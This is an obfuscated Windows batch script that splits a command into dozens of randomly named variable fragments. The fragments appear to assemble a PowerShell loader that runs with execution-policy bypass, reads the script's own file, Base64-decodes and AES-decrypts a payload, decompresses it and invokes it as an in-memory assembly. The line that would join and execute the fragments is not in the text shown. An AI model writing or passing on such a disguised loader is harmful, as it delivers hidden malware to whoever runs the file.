@echo off
set "ELkEasxYxO=we"
set "VHvGKgAMaU=xe"
set "MazhyfpsHN=Sy"
set "TnHdyVEieB=:\"
set "yOJVohXGMS=\W"
set "jOYpvKFPUC=nd"
set "ARrDFNgrJF=ow"
set "dOqqGNXiFa=ws"
set "aYxjwpRsUJ=Po"
set "NEvObmGgNG=ll"
set "FqWYDHSAos=he"
set "dQVrooQEly=co"
set "KrKpfXEPow=0\"
set "bOviABuoqz=py"
set "mpXwSIZNzf=Wi"
set "qYKRhjflvK=\v"
set "siIgsRcOhN=y "
set "FjPwBQMmey=1."
set "CHeUiYEkcW=em"
set "GFBjsbWSRr= /"
set "wxLDCzgPBg=we"
set "WljOnyuPnO=s\"
set "OslgwMNZmI= C"
set "TQSlOLKHCy=rS"
set "iNZYzBIgoi=he"
set "hYroijchQp=po"
set "AaYjmfWFZA=in"
set "ROniRPqyKj=.e"
set "IVmdWrELqn=ll"
set "pPBgPArjeA=32"
set "qPnCbvYuQe=st"
set "FrHSDYovMj=rs"
set "AfqLxAngNB=do"
set "KLOsKihgpe= %~dp0"
set "pSoMvQrDYM=cd"
set "dhVBMivUKJ=d;$I"
set "GqwCTuVELI=saBm"
set "VdcvdFVyfW=6] -"
set "ikBuMOHuth=rofi"
set "FutcBUvdTq=am;$"
set "wynfDWaZFF=..-1"
set "mKMyHsCrFS=lit("
set "nyDuBdSYat=$LAA"
set "AgrbaenHPf=]::("
set "DhmyztFzjd=();$"
set "GRyPmLCqIR=.-16"
set "QcZdwIKaFk=('da"
set "fOYoFrjTdP=[Sys"
set "MDtZiIuBuL=th('"
set "sSQgmguOdU=ose("
set "cQFLKuLDEj= = ["
set "kbyCmbHpza=-ep "
set "xjcLyXvKwN=)) {"
set "KcVjPxBoEN=:: '"
set "vcVwUropgc=vert"
set "wURDHGcnWJ=1] -"
set "jovUIIXHKT=[-1."
set "EAHBTPjpzv=oArr"
set "aqyqKzDArq=BC;$"
set "IbvENvmLQd=mory"
set "nJeGaADccm=DlJL"
set "SfAZaYugKY=$dTj"
set "qrjgwcGOdz=ionM"
set "cxEngSouyh=grap"
set "nTCigyQjqz=brea"
set "bpvHudVDvK= = $"
set "xnTRbgTXRn='')("
set "SjJMetBLwS=Conv"
set "neoexWrxJt=PKCS"
set "PxwkzrTMdd=tS46"
set "fbzzKoItdS=New-"
set "IlEASeinyX=);$I"
set "xqDKcUhBuU=n ''"
set "dntGArgUhk=ress"
set "rxwFYEcSAU= New"
set "vOBpHSnAMu=.Mod"
set "LbeGSmeQhV=);$I"
set "OVNwquNTiM=yTo("
set "YPfgsxDlYS=raph"
set "WEmAoviqTa=tQ.T"
set "uRycNcrKXJ=Invo"
set "YdArwXKwSh=gD);"
set "xvRwCCSnLP=ress"
set "EojkdqGmoG='txe"
set "vsDuKybECq=Bmor"
set "grUscauyKz=and "
set "kXarTDTwdn='gni"
set "UvYxTwUZEU=isfL"
set "TInfAtEwBq=[IO."
set "mQjkCexATj=esMa"
set "GGRmrdhqEr=v4Ir"
set "qNHjSPEjof=OyzA"
set "PwCzYrBtJo=y.Cr"
set "MBXSpxGTLq=lBlo"
set "GJKnxewFJD=Syst"
set "uwVAOZlWiF= = N"
set "iCqrFKnHeo=bUHg"
set "oDaPXixSxx=.Dis"
set "nQJvHfKyKu=+hAO"
set "cvDFxkwJuj=bUHg"
set "QthmvvkatW=oPk."
set "gLnZtNQuAC=ptog"
set "XlLPHbDWYb=onve"
set "rNAgmeLCPO=736u"
set "bZYYdYEVSc=TllA"
set "TUcXnqCVcI=UHgD"
set "MopdXdDpuZ=('%~f0'"
set "zhjNmEtHEG=Stre"
set "DGqvHKuIwf=[]] "
set "xRmTNmfSEN=F'[-"
set "FToGTBfELn=-Obj"
set "yoNEyOvyRN=ptog"
set "EdPIlfAotR=ew-O"
set "gkGDQQbYvX=Syst"
set "NaXKumjHqZ=urit"
set "efauhrHfqJ=..-1"
set "kQfnKbBRvF=ment"
set "DtVQArNyny=D = "
set "FYFtaNjSzy=.Sec"
set "bCmyPFnOYT=, (,"
set "ThchOuWXUz=($Dl"
set "uLyoBvJHCN=ose("
set "FxZUATShtD=gD ="
set "amxGLRYoKq== [S"
set "GqKCUmcbqf=U = "
set "ZBhJCqkriy=::('"
set "BLDkzymikv=oL'["
set "rGUrsSYrUO=rity"
set "MLqndkuguT=.Ass"
set "fhGjkAGNuB=bypa"
set "RXmcHCgTdH=JLm "
set "iJDVwfFgLB=).Sp"
set "JZlvnAREKt=rity"
set "NxEDoAGwri=.Mem"
set "cerzYPXROW= '')"
set "IItidzXZhm=sGUc"
set "pSkzHjXPQQ=tryP"
set "AAGIvkslMu=S46e"
set "edWJWoHCtS= [Sy"
set "lbkgpnhWrp=-joi"
set "YyIzKRiMQA=pose"
set "EXxOVUGKOg=C = "
set "jOQGYZyRqm=tsWi"
set "YiYpBpgjfk=Obje"
set "wcWKRuTpPp=tem."
set "eJcCdXErfn=-4] "
set "nswLZiDIXQ=]::C"
set "AlKCqWjCYO=]::N"
set "AyeGCxqeLM=Qxyt"
set "ULfdMKOEsp=;$VC"
set "VosFECUWMo=();$"
set "EAzNZtBkKN=ateD"
set "wzzhPyiZJS=Mode"
set "afankIYtuA=Disp"
set "aEvBWSBccW=embl"
set "QZwxtlzrWq=UGTu"
set "YXAIbQqCKF=n ''"
set "RzSPFcSPsx=ispo"
set "lGYQYmDGuj=oint"
set "rYZuoQhnYN=$GWW"
set "EgdCHMoHfr=m.Su"
set "UhgDVlMvHV=u) {"
set "Jxeiotnpew=gMod"
set "PMsIATfLav=nC, "
set "dIJgotbPuP=tion"
set "BFTcEmBmwu=0O+g"
set "zgJHKKspai=File"
set "zktcEgbjwq=ddin"
set "CKxcVBfWjl='[-1"
set "RZMxtRXGzS=-1.."
set "aafYfxEZHr=CfaT"
set "OvJomohkIW=form"
set "jMmmeHDAeW=WZG "
set "IlzaWIJxWE=[Env"
set "HZENgdcggi=$ICf"
set "vUVUcivkzp=aT.I"
set "HnyrLrHRvD=, $b"
set "NVKcIGfqvX=yste"
